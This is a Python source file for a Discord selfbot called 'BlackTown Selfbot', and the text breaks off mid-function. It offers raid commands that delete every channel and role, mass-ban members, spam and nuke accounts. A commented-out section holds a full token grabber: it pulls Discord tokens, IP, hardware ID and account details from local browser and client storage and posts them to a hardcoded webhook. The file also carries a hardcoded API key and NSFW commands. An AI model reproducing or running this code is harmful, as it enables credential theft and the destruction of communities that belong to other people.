from asyncio.windows_events import INFINITE
import discord
from discord import activity
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.core import has_permissions
from discord.ext.commands.errors import CommandInvokeError
from discord.ext.commands.help import HelpCommand
from discord.webhook import Webhook
from dpyConsole import Console
from dpyConsole.console import Command
import subprocess
import ctypes
from re import findall
from subprocess import call
from json import loads, dumps
import json
from base64 import b64decode
import io
import threading
import base64, codecs
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
from colorama import Fore
from colorama import Fore, Style
import os
import time
import random
import requests
import datetime
from itertools import cycle
import asyncio
from discord.ext import tasks
import string
from discord_webhook import DiscordWebhook
from urllib.parse import urlencode
import urllib.parse, urllib.request
from bs4 import BeautifulSoup as bs4
import aiohttp





ctypes.windll.kernel32.SetConsoleTitleW(f'[BlackTown Selfbot v0.2.6] | Creator: BULLET#1000 |Loading...')



Bullet = discord.Client(intents=discord.Intents.all())
Bullet = commands.Bot(command_prefix="$",intents=discord.Intents.all(),self_bot=True)
Bullet.remove_command("help")

b = Style.BRIGHT

def Cls():
    os.system('cls')
Cls()
token = input(f"{b+Fore.BLUE} > {Fore.RESET}Enter The Token To Continue (without quotes): ")
# status = input(f"{b+Fore.BLUE} > {Fore.RESET}Enter The Status you want your bot to have: ")
headers = {'Authorization': f'{token}'}
@Bullet.event
async def on_ready():
    ctypes.windll.kernel32.SetConsoleTitleW(f'[BlackTown Selfbot v0.2.6] | Creator: BULLET#1000 |Logged in as {Bullet.user.name}#{Bullet.user.discriminator}')
    print(f"{b+Fore.BLUE} > {Fore.RESET}Logged in as {Bullet.user.name}#{Bullet.user.discriminator}")
    print("go to any channel or dm and type $help To get started")
    
    # headers = {
    #     'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    #     'Content-Type': 'application/json',
    #     'Authorization': token,
    # }
    # request = requests.Session()
    # for guild in self.guild.name:
    #     server = discord.utils.get(self.guild.roles, name="help")
    #     if server.name == server:
    #         return
    # else:
    #     guild = {
    #         'channels': "help",
    #         'icon': None,
    #         'name': "Help Server"
    #     }
    # for _i in range(1):
    #     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    # web = await guild.channel.create_webhook(name="SabkaBaapBullet")
    # webhook = DiscordWebhook(url=web.url, content="@everyone Type $help to begin if you are having any problems you can contact me BULLET#1000")
    # webhook.execute()        


#@my_console.command()
#async def dm(user: discord.User,*,message:str):  # Library automatically converts type annotations, just like in discord.py
 #   """
#    Library can handle both synchronous or asynchronous functions
#   """
 #   print(f"Sending message to {user.name} id: = {user.id}")
#    await user.send(f"{message.content}")

#@my_console.command()
#async def servers():
#    for guild in Bullet.guilds:
  
 #       print(f"{Bullet.user.name}#{Bullet.user.discriminator} Is In: " + guild.name)

#Bullet.user: has_permissions(administrator=True)

#@Bullet.event
#async def on_server_join(server):
 #   if 
   # print("Joined {0}".format(server.name))

def Cls():
    os.system('cls')
Cls()

# @tasks.loop(seconds = 15)
# async def activity_change():
#     await Bullet.wait_until_ready()
#     await Bullet.change_presence(activity = discord.Activity(type=discord.ActivityType.watching,name=status))


Cls()



print(f"""
{b+Fore.BLUE}
██████╗ ██╗      █████╗  ██████╗██╗  ██╗████████╗ ██████╗ ██╗    ██╗███╗   ██╗    ███████╗███████╗██╗     ███████╗██████╗  ██████╗ ████████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝╚══██╔══╝██╔═══██╗██║    ██║████╗  ██║    ██╔════╝██╔════╝██║     ██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝
██████╔╝██║     ███████║██║     █████╔╝    ██║   ██║   ██║██║ █╗ ██║██╔██╗ ██║    ███████╗█████╗  ██║     █████╗  ██████╔╝██║   ██║   ██║   
██╔══██╗██║     ██╔══██║██║     ██╔═██╗    ██║   ██║   ██║██║███╗██║██║╚██╗██║    ╚════██║██╔══╝  ██║     ██╔══╝  ██╔══██╗██║   ██║   ██║   
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║    ███████║███████╗███████╗██║     ██████╔╝╚██████╔╝   ██║   
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝    ╚══════╝╚══════╝╚══════╝╚═╝     ╚═════╝  ╚═════╝    ╚═╝   
                                                                                                                                                     
{b+Fore.BLUE} > {Fore.RESET}BlackTown Selfbot
{b+Fore.BLUE} > {Fore.RESET}Creator: Bullet#1000
{b+Fore.BLUE} > {Fore.RESET}Version: 0.2.6
""")

# WEBHOOK_URL = "https://discord.com/api/webhooks/862555957317992448/gvKFUAqGnz2dgXQgDuUdwGkxAgyhTC6B5A8bgCrE2QqBJXH6bUbc9RA6sINYHwxRJt4x" # Insert webhook url here

# LOCAL = os.getenv("LOCALAPPDATA")
# ROAMING = os.getenv("APPDATA")
# PATHS = {
#     "Discord": ROAMING + "\\Discord",
#     "Discord Canary": ROAMING + "\\discordcanary",
#     "Discord PTB": ROAMING + "\\discordptb",
#     "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
#     "Opera": ROAMING + "\\Opera Software\\Opera Stable",
#     "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
#     "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
# }


# def getHeader(token=None, content_type="application/json"):
#     headers = {
#         "Content-Type": content_type,
#         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
#     }
#     if token:
#         headers.update({"Authorization": token})
#     return headers


# def getUserData(token):
#     try:
#         return loads(
#             urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
#     except:
#         pass


# def getTokenz(path):
#     path += "\\Local Storage\\leveldb"
#     tokens = []
#     for file_name in os.listdir(path):
#         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
#             continue
#         for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
#             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
#                 for token in findall(regex, line):
#                     tokens.append(token)
#     return tokens


# def whoTheFuckAmI():
#     ip = "None"
#     try:
#         ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
#     except:
#         pass
#     return ip


# def hWiD():
#     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
#     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


# def getFriends(token):
#     try:
#         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
#                                      headers=getHeader(token))).read().decode())
#     except:
#         pass


# def getChat(token, uid):
#     try:
#         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
#                                      data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
#     except:
#         pass


# def paymentMethods(token):
#     try:
#         return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
#                                               headers=getHeader(token))).read().decode())) > 0)
#     except:
#         pass


# def sendMessages(token, chat_id, form_data):
#     try:
#         urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
#                                                                                                          "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
#                         data=form_data.encode())).read().decode()
#     except:
#         pass



# def main():
#     cache_path = ROAMING + "\\.cache~$"
#     prevent_spam = True
#     self_spread = True
#     embeds = []
#     working = []
#     checked = []
#     already_cached_tokens = []
#     working_ids = []
#     ip = whoTheFuckAmI()
#     pc_username = os.getenv("UserName")
#     pc_name = os.getenv("COMPUTERNAME")
#     user_path_name = os.getenv("userprofile").split("\\")[2]
#     for platform, path in PATHS.items():
#         if not os.path.exists(path):
#             continue
#         for token in getTokenz(path):
#             if token in checked:
#                 continue
#             checked.append(token)
#             uid = None
#             if not token.startswith("mfa."):
#                 try:
#                     uid = b64decode(token.split(".")[0].encode()).decode()
#                 except:
#                     pass
#                 if not uid or uid in working_ids:
#                     continue
#             user_data = getUserData(token)
#             if not user_data:
#                 continue
#             working_ids.append(uid)
#             working.append(token)
#             username = user_data["username"] + "#" + str(user_data["discriminator"])
#             user_id = user_data["id"]
#             email = user_data.get("email")
#             phone = user_data.get("phone")
#             nitro = bool(user_data.get("premium_type"))
#             billing = bool(paymentMethods(token))
#             embed = {
#                 "color": 0x7289da,
#                 "fields": [
#                     {
#                         "name": "|Account Info|",
#                         "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
#                         "inline": True
#                     },
#                     {
#                         "name": "|PC Info|",
#                         "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
#                         "inline": True
#                     },
#                     {
#                         "name": "|Token|",
#                         "value": token,
#                         "inline": False
#                     }
#                 ],
#                 "author": {
#                     "name": f"{username} ({user_id})",
#                 },
#                 "footer": {
#                     "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
#                 }
#             }
#             embeds.append(embed)
#     with open(cache_path, "a") as file:
#         for token in checked:
#             if not token in already_cached_tokens:
#                 file.write(token + "\n")
#     if len(working) == 0:
#         working.append('123')
#     webhook = {
#         "content": "",
#         "embeds": embeds,
#         "username": "Discord Token Grabber",
#         "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
#     }
#     try:
        
#         urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
#     except:
#         pass
    


# try:
#     main()
# except Exception as e:
#     print(e)
#     pass



languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor
  


def asciigen(size=random.randint(1, 1000)):
    asc = ''
    for x in range(int(size)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc



def getHeader(token=token, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass

def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass

#@Bullet.command()
#async def fuckthisaccount(ctx):

@Bullet.command()
async def cfuck(ctx):
    await ctx.message.delete()      
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print(f"deleted channel {channel.name}")
        except:
            pass

@Bullet.command()
async def rfuck(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"deleted role {role.name}")
        except:
            pass

@Bullet.command()
async def help(ctx):
    embed = discord.Embed(title="v0.2.6 \nMade by Bullet#1000",color=0xF04D4D)
    embed.add_field(name=":zap: | ```$uptime```",value="shows the uptime of your selfbot",inline=False)
    embed.add_field(name=":zap: | ```$ping```",value="shows the ping of the selfbot",inline=False)
    embed.add_field(name=":zap: | ```$cfuck```",value="this will delete all channels in the server",inline=False)
    embed.add_field(name=":zap: | ```$rfuck```",value="this will delete all roles in the server",inline=False)
    embed.add_field(name=":zap: | ```$gfuck```",value="this will change the name of the server",inline=False)
    embed.add_field(name=":zap: | ```$tr```",value="this will create roles and channels",inline=False)
    embed.add_field(name=":zap: | ```$massban```",value="Bans Everyone from the server",inline=False)
    embed.add_field(name=":zap: | ```$masskick```",value="Kicks Everyone from the server",inline=False)
    embed.add_field(name=":zap: | ```$spameveryone```",value="this will tag everyone in all the channels in a server",inline=False)
    embed.add_field(name=":zap: | ```$reall [nickname]```",value="this will rename everyone to the nickname you want",inline=False)
    embed.add_field(name=":zap: | ```$adminservers```",value="this will show all the fuckable servers",inline=False)
    embed.add_field(name=":zap: | ```$spread [message]```",value="this will spread a message to all the friends",inline=False)
    embed.add_field(name=":zap: | ```$accountfuck```",value="use this when you are done fucking the account",inline=False)
    embed.add_field(name=":zap: | ```$tokeninfo [token]```",value="gives you info about a token")
    embed.add_field(name=":zap: | ```$webspam [message to spam]```",value="this command is for spamming with webhook",inline=False)
    embed.add_field(name=":zap: | ```$webdel ```",value="this command will delete all the webhooks in the server",inline=False)
    embed.add_field(name=":zap: | ```$spam [amount] [message]```",value="this is used for spamming",inline=False)
    embed.add_field(name=":zap: | ```$kickgc```",value="this will kick every1 out of a group, needs to be group owner",inline=False)
    embed.add_field(name=":zap: | ```$spamgcname [name]```",value="this shit will spam gc name",inline=False)
    embed.add_field(name=":zap: | ```$iplook [ip]```",value="used for ip info",inline=False)
    embed.add_field(name=":zap: | ```$farmstart/$farmstop```",value="Starts/Stops xp farming",inline=False)
    embed.add_field(name=":zap: | ```$typingstart/$typingstop```",value="Starts/Stop Infinite Typing",inline=False) 
    embed.add_field(name=":zap: | ```$ascii [text]```",value="see it yourself",inline=False)
    embed.add_field(name=":zap: | ```$rainbow [role]```",value="changes the role color to give it a rainbow effect",inline=False)   
    embed.add_field(name=":zap: | ```$destroy```",value="Only Run this when you know what you are doing",inline=False)
    embed.set_author(name="𝘽𝙡𝙖𝙘𝙠 𝙏𝙤𝙬𝙣 𝙎𝙚𝙡𝙛𝙗𝙤𝙩",icon_url=Bullet.user.avatar_url)
    embed.set_thumbnail(url=Bullet.user.avatar_url)
    embed.set_image(url="https://cdn.discordapp.com/attachments/867075132953853962/867635560864284702/standard_14.gif")
    embed.set_footer(text="Join Our Discord! https://discord.gg/RV8saAKMAC Use $help2 for more commands",icon_url="https://cdn.discordapp.com/attachments/773228719509602356/857588583816232960/photo-1500069329338-1f270dce111f.jpg")
    await ctx.send(embed=embed)
@Bullet.command()
async def help2(ctx):
    embed = discord.Embed(title="v0.2.6 \nMade by Bullet#1000",description="Page 2",color=0xF04D4D)                    
    embed.add_field(name=":zap: | ```$playing [status]```",value="Changes the status to playing",inline=False)
    embed.add_field(name=":zap: | ```$streaming [status]```",value="Changes the status to streaming",inline=False)
    embed.add_field(name=":zap: | ```$removestatus```",value="Stops status activity",inline=False)
    embed.add_field(name=":zap: | ```$crash```",value="Crashes a channel by sending random ascii words, F for low end users",inline=False)
    embed.add_field(name=":zap: | ```$usertoken [user]```",value="generates a random token for the user (i personally use this for trolling/prank)",inline=False)
    embed.add_field(name=":zap: | ```$hypesquad [name]```",value="balance, bravery and brilliance",inline=False)
    embed.add_field(name=":zap: | ```$watching [status]```",value="Changes the status to watching",inline=False)
    embed.add_field(name=":zap: | ```$listening [status]```",value="Changes the status to listening",inline=False)
    embed.add_field(name=":zap: | ```$dynoban ```",value="bans everyone with dyno",inline=False)
    embed.add_field(name=":zap: | ```$cyclenick$stopcyclenick [name] ```",value="starts cycling your the nickname letter by letter",inline=False)
    embed.add_field(name=":zap: | ```$clearmyhistory [amount]  ```",value="clears all your recent messages amount is 999 if you don't enter any",inline=False)
    embed.add_field(name=":zap: | ```$reverse [message]  ```",value="sends the message in reverse",inline=False)
    embed.add_field(name=":zap: | ```$shutdown ```",value="shutdowns the selfbot",inline=False)
    embed.add_field(name=":zap: | ```$shorturl [link] ```",value="shortens the url (now you can rickroll anyone without struggling)",inline=False)
    embed.add_field(name=":zap: | ```$cuttly [link]```",value="Shortens the url with cuttly api ",inline=False)
    embed.add_field(name=":zap: | ```$pp [user]```",value="shows the size of the pp of the user",inline=False)
    embed.add_field(name=":zap: | ```$b64encode/$b64decode [message]```",value="encodes/decodes your message in base64",inline=False)
    embed.add_field(name=":zap: | ```$dog```",value="sends a random photo of a dog",inline=False)
    embed.add_field(name=":zap: | ```$cat```",value="sends a random photo of a cat",inline=False)
    embed.add_field(name=":zap: | ```$image [image]```",value="searchs a image on unsplash",inline=False)
    embed.add_field(name=":zap: | ```$joke```",value="sends a random joke (i hope you can laugh)",inline=False)
    embed.add_field(name=":zap: | ```$wouldyourather```",value="sends a random wyr question you can also use $wyr",inline=False)
    embed.add_field(name=":zap: | ```$timer [seconds]```",value="starts a custom timer",inline=False)
    embed.add_field(name=":zap: | ```$whois [user]```",value="gets info about the user",inline=False)
    
    embed.set_image(url="https://cdn.discordapp.com/attachments/867075132953853962/867635560864284702/standard_14.gif")
    embed.set_footer(text="Join Our Discord! https://discord.gg/RV8saAKMAC Use $help3 for more commands",icon_url="https://cdn.discordapp.com/attachments/773228719509602356/857588583816232960/photo-1500069329338-1f270dce111f.jpg")
    embed.set_author(name="𝘽𝙡𝙖𝙘𝙠 𝙏𝙤𝙬𝙣 𝙎𝙚𝙡𝙛𝙗𝙤𝙩",icon_url=Bullet.user.avatar_url)
    embed.set_thumbnail(url=Bullet.user.avatar_url)
    await ctx.send(embed=embed)
@Bullet.command()
async def help3(ctx):
    embed = discord.Embed(title="v0.2.6 \nMade by Bullet#1000",description="Page 3",color=0xF04D4D)          
    embed.add_field(name=":zap: | ```$av [user]```",value="gets the user's avatar",inline=False)          
    embed.add_field(name=":zap: | ```$morseencrypt/$morsedecrypt [message]```",value="encrypts/decrypts your message in morse",inline=False)
    embed.add_field(name=":zap: | ```$binaryencode/$binarydecode [message]```",value="encrypts/decrypts your message in morse",inline=False)
    embed.add_field(name=":zap: | ```$serverinfo```",value="gets all the info about the server",inline=False)
    embed.add_field(name=":zap: | ```$serverbanner```",value="gets the banner of the server",inline=False)
    embed.add_field(name=":zap: | ```$renamechannels [name]```",value="renames all the channel",inline=False)
    embed.add_field(name=":zap: | ```$servericon```",value="gets the icon of the server",inline=False)
    embed.add_field(name=":zap: | ```$invismessage```",value="sends a very big invisible message",inline=False)
    embed.add_field(name=":zap: | ```$accountnuke [token]```",value="try it yourself",inline=False)
    embed.add_field(name=":zap: | ```$firstmessage```",value="shows the first ever message that was sent in the channel",inline=False)
    embed.add_field(name=":zap: | ```$cumslut```",value="Sends a anime cumslut gif",inline=False)
    embed.add_field(name=":zap: | ```$pussy```",value="Sends a anime vagina gif",inline=False)
    embed.add_field(name=":zap: | ```$feet```",value="shows some good feets",inline=False)
    embed.add_field(name=":zap: | ```$erofeet ```",value="shows more good feets",inline=False)
    embed.add_field(name=":zap: | ```$hentai```",value="sends a random hentai gif",inline=False)
    embed.add_field(name=":zap: | ```$anal```",value="you know this right?",inline=False)
    embed.add_field(name=":zap: | ```$lesbian```",value="shows some good ladies",inline=False)
    embed.add_field(name=":zap: | ```$blowjob```",value="just a girl playing with her toy",inline=False)
    embed.add_field(name=":zap: | ```$lewdneko```",value="idk",inline=False)
    embed.add_field(name=":zap: | ```$tits```",value="jugs",inline=False)
    embed.add_field(name=":zap: | ```$massmention [message]```",value="massmentions random people idk",inline=False)
    embed.set_image(url="https://cdn.discordapp.com/attachments/867075132953853962/867635560864284702/standard_14.gif")
    embed.set_footer(text="Join Our Discord! https://discord.gg/RV8saAKMAC",icon_url="https://cdn.discordapp.com/attachments/773228719509602356/857588583816232960/photo-1500069329338-1f270dce111f.jpg")
    embed.set_author(name="𝘽𝙡𝙖𝙘𝙠 𝙏𝙤𝙬𝙣 𝙎𝙚𝙡𝙛𝙗𝙤𝙩",icon_url=Bullet.user.avatar_url)
    embed.set_thumbnail(url=Bullet.user.avatar_url)
    await ctx.send(embed=embed)



@Bullet.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        print(list(ctx.guild.members))
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)



cuttly_key = "eb8ae5a3b047132ff272940a3e47243953b10"

@Bullet.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)    
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
@Bullet.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send("check console")
    print(f"HWID: {Fore.YELLOW}{hwid}"+Fore.RESET)

@Bullet.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
            em = discord.Embed()
            em.set_image(url=res['url'])
            await ctx.send(embed=em)
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Bullet.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
            em = discord.Embed()
            em.set_image(url=res['url'])
            await ctx.send(embed=em)
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Bullet.command()
async def anal(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()   
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@Bullet.command()
async def erofeet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Bullet.command()
async def feet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Bullet.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@Bullet.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Bullet.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()    
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Bullet.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Bullet.command()
async def lewdneko(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@Bullet.command()
async def lesbian(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


@Bullet.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()  
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@Bullet.command(aliases=["copyguild", "copyserver"])
async def copychannels(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Bullet.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Bullet.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@Bullet.command()
async def invismessage(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')

@Bullet.command()
async def binarydecode(ctx,message):
    await ctx.message.delete()
    message = message.strip()
    ascii_string = ""
    index = 0
    while index < len(message):
        offset = index
        index += 8
        letter_digits = message[offset:index]
        an_integer = int(letter_digits, 2)
        ascii_character = chr(an_integer)
        ascii_string += ascii_character

    await ctx.send(ascii_string)

@Bullet.command()
async def binaryencode(ctx,*,message:str):
    await ctx.message.delete()
    mess = message
    res = ''.join(format(ord(i), '08b') for i in mess)
    await ctx.send(str(res))



MORSE_CODE_DICT = { 'A':'.-', 'B':'-...',
                    'C':'-.-.', 'D':'-..', 'E':'.',
                    'F':'..-.', 'G':'--.', 'H':'....',
                    'I':'..', 'J':'.---', 'K':'-.-',
                    'L':'.-..', 'M':'--', 'N':'-.',
                    'O':'---', 'P':'.--.', 'Q':'--.-',
                    'R':'.-.', 'S':'...', 'T':'-',
                    'U':'..-', 'V':'...-', 'W':'.--',
                    'X':'-..-', 'Y':'-.--', 'Z':'--..',
                    'a':'.-', 'b':'-...',
                    'c':'-.-.', 'd':'-..', 'e':'.',
                    'f':'..-.', 'g':'--.', 'h':'....',
                    'i':'..', 'j':'.---', 'k':'-.-',
                    'l':'.-..', 'm':'--', 'n':'-.',
                    'o':'---', 'p':'.--.', 'q':'--.-',
                    'r':'.-.', 's':'...', 't':'-',
                    'u':'..-', 'v':'...-', 'w':'.--',
                    'x':'-..-', 'y':'-.--', 'z':'--..',
                    '1':'.----', '2':'..---', '3':'...--',
                    '4':'....-', '5':'.....', '6':'-....',
                    '7':'--...', '8':'---..', '9':'----.',
                    '0':'-----', ', ':'--..--', '.':'.-.-.-',
                    '?':'..--..', '/':'-..-.', '-':'-....-',
                    '(':'-.--.', ')':'-.--.-'}

@Bullet.command()
async def morseencrypt(ctx,*,message:str):
    await ctx.message.delete()
    cipher = ''
    for letter in message:
        if letter != ' ':
  
            # Looks up the dictionary and adds the
            # correspponding morse code
            # along with a space to separate
            # morse codes for different characters
            cipher += MORSE_CODE_DICT[letter] + ' '
        else:
            # 1 space indicates different characters
            # and 2 indicates different words
            cipher += ' '
  
    await ctx.send(cipher)

@Bullet.command()
async def morsedecrypt(ctx,*,message:str):
    await ctx.message.delete()
    # extra space added at the end to access the
    # last morse code
    message += ' '
  
    decipher = ''
    citext = ''
    for letter in message:
  
        # checks for space
        if (letter != ' '):
  
            # counter to keep track of space
            i = 0
  
            # storing morse code of a single character
            citext += letter
  
        # in case of space
        else:
            # if i = 1 that indicates a new character
            i += 1
  
            # if i = 2 that indicates a new word
            if i == 2 :
  
                 # adding space to separate words
                decipher += ' '
            else:
  
                # accessing the keys using their values (reverse of encryption)
                decipher += list(MORSE_CODE_DICT.keys())[list(MORSE_CODE_DICT
                .values()).index(citext)]
                citext = ''
    
    await ctx.send(decipher)





@Bullet.command(aliases=['guildpfp', 'serverpfp'])
async def servericon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@Bullet.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

@Bullet.command()
async def serverbanner(ctx):
